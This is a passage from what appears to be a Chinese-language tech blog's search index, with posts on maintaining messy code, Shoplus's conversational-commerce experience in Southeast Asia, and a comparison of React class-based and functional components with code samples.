class="string">&quot;test&quot;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">advance</span>: &#123;</span><br><span class="line">    <span class="attr">password</span>: <span class="string">&quot;***&quot;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(user.<span class="property">basic</span>.<span class="property">name</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">TestComponent</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">Parent</span>&gt;</span>&#123;this.props.children&#125;<span class="tag">&lt;/<span class="name">Parent</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">withEventTracking</span>(<span class="title function_">withFavorites</span>(<span class="title function_">withAccount</span>(<span class="title class_">TestComponent</span>)));</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">ModuleA</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title function_">setStateInModuleB</span>();</span><br><span class="line">  <span class="title function_">setStateInModuleC</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ModuleB</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title function_">setStateInModuleA</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ModuleC</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title function_">setStateInModuleA</span>();</span><br><span class="line">  <span class="title function_">setStateInModuleB</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="重構難維護的解決方案"><a href="#重構難維護的解決方案" class="headerlink" title="重構難維護的解決方案"></a>重構難維護的解決方案</h2><blockquote><p>用冷門且有點學習、維護門檻的解決方案</p></blockquote><p>覺得如果還年輕，沒有職場壓力的前提下，還是用好維護且容易的方式解決問題，這才是培養競爭力 QQ 之前有看過比較少人用且可能比較難維護的:</p><ul><li>redux-orm</li><li>lua</li><li>魔改過的 create-app-script</li></ul><blockquote><p>使用無意義或很難搜尋的的敘述或縮寫來做判斷條件</p></blockquote><p>這個真的就是只能逐步慢慢改，初期可能還是把 call function 當 call API 來用就好了 Orz</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// conditions[3] 你好 9527</span></span><br><span class="line"><span class="keyword">if</span> (conditions[<span class="number">3</span>].<span class="property">value</span> === <span class="string">&quot;9527&quot;</span>) &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 看懂暗號只需要一個眼神，所以是 signal 還是 show girl?</span></span><br><span class="line"><span class="keyword">switch</span> (sg === <span class="string">&quot;9487&quot;</span>) &#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">&quot;ccc&quot;</span>:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">&quot;www&quot;</span>:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 軟體工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 個人成長 </tag>
            
            <tag> 軟體工程 </tag>
            
            <tag> 專案管理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shoplus 東南亞經驗分享 (Conversational Commerce)</title>
      <link href="/2020/06/08/thinking-conversational-commerce/"/>
      <url>/2020/06/08/thinking-conversational-commerce/</url>
      
        <content type="html"><![CDATA[<blockquote><p>產品最重要的就是： 我們現在嘗試要解決的問題是什麼？</p></blockquote><h2 id="從使用者出發"><a href="#從使用者出發" class="headerlink" title="從使用者出發"></a>從使用者出發</h2><p>回想使用者歷程、痛點、使用流程、使用軟體應用的情境，也許是剛性需求也可能只是想要消耗時間。</p><ol><li><p>搭配 Deadline 服用後會得到縮小範圍後的問題</p></li><li><p>運用資源去驗證問題</p><ul><li>找相關人員得到任何有幫助的資料或進行任何協助</li><li>開源專案通常會用 Lightning talks</li></ul></li><li><p>使用者訪談</p></li><li><p>國族民情研究</p></li></ol><p>為什麼會選擇社群電商，沒理解錯的話，應該是下面兩個理由：</p><ul><li>東南亞社群媒體的興起</li><li>東南亞習慣透過社群進行購買行為，社群電商其實就是聊天 + 買東西</li></ul><p>其實小編本人也是<a href="https://www.bnext.com.tw/article/56006/chiayokuo-digitaldiplomacy-vietnam">數位外交協會的志工</a>，協會也因為發現了這樣的狀況，選擇在今年深耕越南。</p><p>為了讓做的事情更符合地方，協會大量的接觸並與在台的越南人進行合作，在 Shoplus 剛到越南時，也透過大量的使用者訪談與觀察，覺得有興趣多了解的話可以參考 <a href="https://developers.google.com/web/fundamentals/design-and-ux/ux-basics">Double Diamond</a>。</p><h2 id="解決方案的選擇"><a href="#解決方案的選擇" class="headerlink" title="解決方案的選擇"></a>解決方案的選擇</h2><p>如果使用者本來就在社群平台上花很多時間，隨著開發中國家的發展，<a href="https://www.statista.com/statistics/272014/global-social-networks-ranked-by-number-of-users/">社群平台 MAU</a> 趨勢也無懸念的會一直往上。</p><ul><li>Facebook 2498M</li><li>YouTube, WhatApp* 2000M</li><li>Facebook Messenger 1300M</li></ul><p>如果在不改變使用者習慣的前提下，既然用戶也都在平台上那麼平台就該是一種通路，IG 在部分市場也推出了<a href="https://help.instagram.com/191462054687226">直接購物的功能</a>，Google 地圖也推出了 <a href="https://www.google.com/business/">My Business</a> 讓商家可以在地圖 APP 上與消費者互動。</p><p>其實我認為網路通路是雙面刃，雖然減少了實體的店面成本多了價格彈性，但因無法接觸實體產品增加了許多不確定性，透過對話解決顧客疑問變成必要的一個方向，<a href="https://smooch.io/state-of-messaging-2019/">83% 的人曾經透過聯絡官方帳號詢問相關事項</a>，畢竟對於使用者來說：</p><ul><li>使用 chat 方便快速</li><li>單一介面</li><li>容易上手</li><li>更像是在跟人互動</li><li>比起 email 等方式更加及時</li><li>支付更方便 (近幾年越來越多的 XX Pay 出現)<ul><li>Line Pay</li><li>Facebook Pay (台灣還不能用)</li><li>Apple Pay</li><li>Google Pay</li></ul></li></ul><p>社群之於大多數的企業來說：</p><ul><li>品牌認知形象營造</li><li>行銷人員的行銷手段 (Line 集點卡)</li><li>如果使用 Chatbot，更新改版成本較低且方便快速</li></ul><p>Satya Nadella 更提出了對話即平台 (Conversation as a Platform) 的概念，對於較小且有成本考量的商家，直接使用這樣的系統應該會是不錯的選項，缺點是後續跨平台的分析跟再行銷上可能？也不像傳統網站那麼容易。</p><h2 id="觀察情境與問題"><a href="#觀察情境與問題" class="headerlink" title="觀察情境與問題"></a>觀察情境與問題</h2><ul><li>社群電商不會只是看規格，更多的是會看賣家本身的特質</li><li>買家會同時買很多一樣的，晚到的就退貨</li><li>買家會問很多問題，可以加快送貸？這衣服瘦的人穿好看嗎？鞋子要買剛好大小的嗎？</li><li>透過一些 Data 的模組來幫助商家了解如何推廣</li><li>透過聊天對話進息交易，小編透過跟直播主的聊天紀錄整理訂單</li><li>對話式商務發展後，主要就是人力成本問題，如果 500 筆訂單，就需要 <code>500 * N</code> 次的回覆</li><li>開發出購物車功能，卻發現幾乎不被使用</li><li>大量的 Facebook 社團就好像批踢踢的各種討論版一樣</li><li>會受時間的影響在過年期間，大部分的小編放假，社群電商的使用會大量下降</li><li>因為武漢肺炎讓社群電商逆勢成長</li></ul><table><thead><tr><th>菲律賓</th><th>泰國</th><th>越南</th></tr></thead><tbody><tr><td>Facebook 瀏覽不佔網路流量</td><td>超過八成的商家會使用社群電商賣貨</td><td>買家為主的市場</td></tr><tr><td></td><td></td><td>習慣貨到付款</td></tr></tbody></table><h2 id="技術實作"><a href="#技術實作" class="headerlink" title="技術實作"></a>技術實作</h2><p>技術實作上，以 <a href="https://github.com/fbsamples/messenger-platform-samples/blob/master/quick-start/app.js">Facebook Customer Chat Plugin</a> 範例的程式碼可以看到相關的 code 其實也不用寫的很多，就是接到訊息後然後分析訊息。</p><p>自然語言處理在我求學階段，算是偏難的主題，隨著雲端服務還有機器學習的發展，現在應該進步很多，真正的問題應該在小語系沒什麼人做，iKala 就在這個部分找到切入點，為小語系做精準 Purchase Intent 的判斷，透過自動將關鍵字轉成訂單、機器人聊天提醒付錢，減少有很多需要手動的問題。另外 iKala 也有強大的資料處理分析能力，透過 Data-Driven 的行銷模組讓產品更加分。</p><p>其他相關的 Chatbot 有興趣研究的話：</p><ul><li>Facebook Customer Chat Plugin</li><li>eBay Shopbot</li><li>Apple Business Chat</li><li>WeChat</li></ul><h2 id="相關討論"><a href="#相關討論" class="headerlink" title="相關討論"></a>相關討論</h2><p>Q： 當地沒有一般的電商嗎？ 為什麼社群電商還是可以生存？</p><blockquote><p>A： 社群電商可以看成更方便的電視購物，直播主的戲劇性可能還更高一點，靠的是 KOL 本身的魅力</p></blockquote><p>Q： 這應該也算是科技產品，請問是怎麼找到跟推坑第一批使用者？</p><blockquote><p>A： 你是工程師對吧？ <del>你們 PM 是不是不太夠力？</del> 我們也一樣沒有捷徑。<br>量化分析的話 Amplitude 這種工具一定要裝 (Amplitude, Mixpanel, Segment)<br>質化就是使用者訪談，回去問問你們 PM 多久沒做訪談了</p></blockquote><p>Q： 跨國團隊語言溝通會有困難嗎?</p><blockquote><p>A： 有時候甚至還用畫的，語言只是溝通工具</p></blockquote><p>對了，團隊正在徵才，沒開出符合的職位也可以應徵，只要覺得能力夠也可以幫助團隊，就快去投吧!!!!</p>]]></content>
      
      
      <categories>
          
          <category> 產業觀察 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 產業觀察 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React Class-based vs Functional Component</title>
      <link href="/2020/02/02/react-component-class-based-vs-functional/"/>
      <url>/2020/02/02/react-component-class-based-vs-functional/</url>
      
        <content type="html"><![CDATA[<h2 id="Class-based-vs-Functional-Component"><a href="#Class-based-vs-Functional-Component" class="headerlink" title="Class-based vs Functional Component"></a>Class-based vs Functional Component</h2><p>React 要寫出一個元件，有 <code>Class-based</code> 或是 <code>Functional</code> 兩種方式，這篇文章會從寫法比較、元件特性、週期去談兩種寫法的差異，結論先直接推薦 <code>Functional</code> 的方式。</p><p>大多數的情境在 Hooks 出現後都可以取代 Class-based 的寫法，優缺點比較:</p><table><thead><tr><th>項目</th><th>Functional</th><th>Class-based</th></tr></thead><tbody><tr><td>編譯快</td><td>勝 (少了繼承 class 轉成 ES5)</td><td></td></tr><tr><td>更少程式碼</td><td>勝 (沒有繼承)</td><td></td></tr><tr><td>測試容易</td><td>勝 (元件週期單純)</td><td></td></tr><tr><td>this 的影響</td><td>勝 (閉包<a href="https://reactjs.org/docs/hooks-faq.html#why-am-i-seeing-stale-props-or-state-inside-my-function">會抓住值</a>)</td><td>this.props (state) 會改變</td></tr><tr><td>複雜狀態操作</td><td></td><td>勝 (有 batch，可同時設多個狀態，自動合併狀態物件)</td></tr><tr><td>複雜的情境</td><td>架構上就要切割乾淨</td><td>勝 (較多元件週期可以操作)</td></tr></tbody></table><h3 id="寫法比較"><a href="#寫法比較" class="headerlink" title="寫法比較"></a>寫法比較</h3><p>接著示範同樣的功能但兩種不同的寫法，可以發現:</p><ul><li><code>Class-based</code> 多了 <code>extends</code> 和 <code>render()</code> 的寫法，白話就是編譯過後的程式碼會比較多行</li><li><code>Functional</code> 則是使用接近原生的寫法，不需要寫 <code>render()</code> 編譯後會自動在 return JSX 時叫用 react 提供的函式轉成元件</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Class-based</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Input</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>();</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">state</span> = &#123; <span class="attr">input</span>: <span class="string">&quot;&quot;</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">handleInput</span> = <span class="variable language_">this</span>.<span class="property">handleInput</span>.<span class="title function_">bind</span>(<span class="variable language_">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">handleInput</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123; <span class="attr">input</span>: e.<span class="property">target</span>.<span class="property">value</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onChange</span>=<span class="string">&#123;handleInput&#125;</span> <span class="attr">value</span>=<span class="string">&#123;this.state.input&#125;</span> /&gt;</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Functional</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Input</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> [input, setInput] = <span class="title class_">React</span>.<span class="title function_">useState</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onChange</span>=<span class="string">&#123;(e)</span> =&gt;</span> setInput(e.target.value)&#125; value=&#123;input&#125; /&gt;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Class-based-元件"><a href="#Class-based-元件" class="headerlink" title="Class-based 元件"></a>Class-based 元件</h3><p>適合實作較複雜且有 side effect 的元件，舉例來說想優化效能時通常就會用 <code>shouldComponentUpdate()</code> 元件特性如下:</p><ul><li>元件有內部狀態</li><li>多種元件週期可以進行操作</li></ul><p>React 在狀態改變的時候會把 setState 的動作 <a href="https://reactjs.org/docs/state-and-lifecycle.html#state-updates-may-be-asynchronous">batch</a> 起來，所以建議使用 callback 的 function 去設定。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="title function_">setState</span>(<span class="function">(<span class="params">state, props</span>) =&gt;</span> (&#123;</span><br><span class="line">  <span class="attr">counter</span>: state.<span class="property">counter</span> + props.<span class="property">increment</span>,</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure><p>另外因為 Class 元件狀態主要為 Object 所以可以輕易做到動態 Key 的設定。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">handleInputChange</span>(<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123; [event.<span class="property">target</span>.<span class="property">id</span>]: event.<span class="property">target</span>.<span class="property">value</span> &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="PureComponent"><a href="#PureComponent" class="headerlink" title="PureComponent"></a>PureComponent</h4><p><a href="https://reactjs.org/docs/react-api.html#reactpurecomponent">PureComponent</a> 其實就是 Pure Function 的進階版，React 幫我們實作了 <code>shouldComponentUpdate()</code> 的內容來優化。概念是確定餵進去相同的 state 跟 props 每次渲染出來的畫面都是一樣的，我們就認為這個是沒有副作用的元件。</p><p>PS: 因為只做 shallowly compares，所以狀態盡量不要使用物件去存。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">shallowEqual</span>(<span class="params">object1, object2</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> keys1 = <span class="title class_">Object</span>.<span class="title function_">keys</span>(object1);</span><br><span class="line">  <span class="keyword">const</span> keys2 = <span class="title class_">Object</span>.<span class="title function_">keys</span>(object2);</span><br><span class="line">  <span class="keyword">if</span> (keys1.<span class="property">length</span> !== keys2.<span class="property">length</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">of</span> keys1) &#123;</span><br><span class="line">    <span class="keyword">if</span> (object1[key] !== object2[key]) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> hero1 = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;Batman&#x27;</span>,</span><br><span class="line">  <span class="attr">address</span>: &#123;</span><br><span class="line">    <span class="attr">city</span>: <span class="string">&#x27;Gotham&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> hero2 = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;Batman&#x27;</span>,</span><br><span class="line">  <span class="attr">address</span>: &#123;</span><br><span class="line">    <span class="attr">city</span>: <span class="string">&#x27;Gotham&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 兩層</span></span><br><span class="line"><span class="title function_">shallowEqual</span>(hero1, hero2); <span class="comment">// =&gt; false</span></span><br></pre></td></tr></table></figure><h3 id="Functional-元件"><a href="#Functional-元件" class="headerlink" title="Functional 元件"></a>Functional 元件</h3><p>React Hooks 加入前，Functional 的元件適合實作較純渲染的元件，元件特性如下，早期如果想寫這樣的元件，架構上就會提早做規劃也會切得比較乾淨。</p><ul><li>不包含元件狀態</li><li>無法操作元件週期</li></ul><p>React Hooks 加入後，Functional 的寫法就開始熱門了起來，因為開始可以透過相對應的 hooks 處理稍微複雜一點的元件了。</p><ul><li>useState: 加入元件狀態，但這裡的 setState 不會幫我們自動合併物件型態的狀態，需要用 callback 方式寫並且自行合併</li><li>useReducer: 可以用來處理物件型態的狀態</li><li>useEffect: 處理 side effect，取代 componentDidMount, componentDidUpdate, componentWillUnmount</li><li>useCallback: 當 function 需要在 useEffect 中被使用但又不想加入觸發條件</li><li>useMemo: 把較高成本計算記起來</li><li>useRef: 取得參考用的 object</li><li>React.memo: 可以當成 Functional 的 Pure Component</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">setState</span>(<span class="function">(<span class="params">prevState</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 用 Object.assign</span></span><br><span class="line">    <span class="keyword">return</span> &#123; ...prevState, ...props.<span class="property">updatedValues</span> &#125;;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;, [props.<span class="property">updatedValues</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// class-based 中用 callback 設定的</span></span><br><span class="line"><span class="keyword">const</span> [state, setState] = <span class="title function_">useState</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> initialState = <span class="title function_">someExpensiveComputation</span>(props);</span><br><span class="line">  <span class="keyword">return</span> initialState;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> memoizedCallback = <span class="title function_">useCallback</span>(fn, [...deps]);</span><br><span class="line"><span class="title function_">useMemo</span>(<span class="function">() =&gt;</span> fn, [...deps]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以用來記錄前一次的值</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">usePrevious</span>(<span class="params">value</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> ref = <span class="title function_">useRef</span>();</span><br><span class="line">  <span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    ref.<span class="property">current</span> = value;</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> ref.<span class="property">current</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="元件狀態"><a href="#元件狀態" class="headerlink" title="元件狀態"></a>元件狀態</h3><p>React 元件有 class 和 function 兩種形式，設定上分兩種:</p><ul><li>class: 物件型態，透過 <code>this.setState()</code> 直接設定元件中的狀態</li><li>function: 值或是物件型態，透過 <code>const [state, setState] = useState();</code> 回傳的 setState()</li></ul><p>由於 class 的狀態一定是物件的型態，對於 Object 型態的狀態會有比較好的處理，舉例來說像是物件的合併機制。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// class setState 實際上做的事情</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123; ...state, <span class="attr">value</span>: <span class="number">0</span> &#125;);</span><br></pre></td></tr></table></figure><p>相對於 hook 在設定上實際上沒有針對物件做預設的物件合併機制。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  setHookState 其實就是單純設定</span></span><br><span class="line"><span class="keyword">const</span> [state, setHookState] = <span class="title function_">useState</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_">setHookState</span>() </span><br><span class="line"></span><br><span class="line">### 元件週期</span><br><span class="line"></span><br><span class="line">因為 hook 無法操作元件週期，但能夠透過 useEffect 達到近似元件週期的效果。</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> <span class="string">`componentDidMount()`</span></span><br><span class="line"></span><br><span class="line"><span class="string">``</span><span class="string">`js</span></span><br><span class="line"><span class="string">componentDidMount() &#123;</span></span><br><span class="line"><span class="string">  fetchData();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">useEffect( () =&gt; &#123; fetchData(); &#125;, [] );</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><ol start="2"><li><code>componentDidUpdate()</code></li></ol><p>值得注意的是 useEffect 的條件中盡量不要使用物件，因為每次都會被看成是不同的。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">componentDidUpdate</span>(<span class="params">prevProps</span>) &#123;</span><br><span class="line">  <span class="comment">// 常見用法（別忘了比較 prop）：</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">props</span>.<span class="property">userID</span> !== prevProps.<span class="property">userID</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">fetchData</span>(<span class="variable language_">this</span>.<span class="property">props</span>.<span class="property">userID</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">useEffect</span>( <span class="function">() =&gt;</span> &#123; <span class="title function_">fetchData</span>(userID); &#125;, [userID] );</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li><code>componentWillUnmount()</code></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">clear</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// componentWillUnmount</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">componentWillUnmount</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title function_">clear</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">clear</span>();</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;, []);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>將元件週期改寫的實際案例:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="title function_">componentDidMount</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> response = <span class="keyword">await</span> axios.<span class="title function_">get</span>(<span class="string">`https://jsonplaceholder.typicode.com/users`</span>)</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123; <span class="attr">users</span>: response.<span class="property">data</span> &#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="title function_">componentDidUpdate</span>(<span class="params">prevProps</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (prevProps.<span class="property">resource</span> !== <span class="variable language_">this</span>.<span class="property">props</span>.<span class="property">resource</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> response = <span class="keyword">await</span> axios.<span class="title function_">get</span>(<span class="string">`https://jsonplaceholder.typicode.com/users`</span>)</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123; <span class="attr">users</span>: response.<span class="property">data</span> &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">fetchUsers</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> response = <span class="keyword">await</span> axios.<span class="title function_">get</span>(<span class="string">`https://jsonplaceholder.typicode.com/users`</span>);</span><br><span class="line"></span><br><span class="line">  <span class="title function_">setUsers</span>(response.<span class="property">data</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">useEffect</span>( <span class="function">() =&gt;</span> &#123; <span class="title function_">fetchUsers</span>(users) &#125;, [ users ] );</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> React.js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 網站技術 </tag>
            
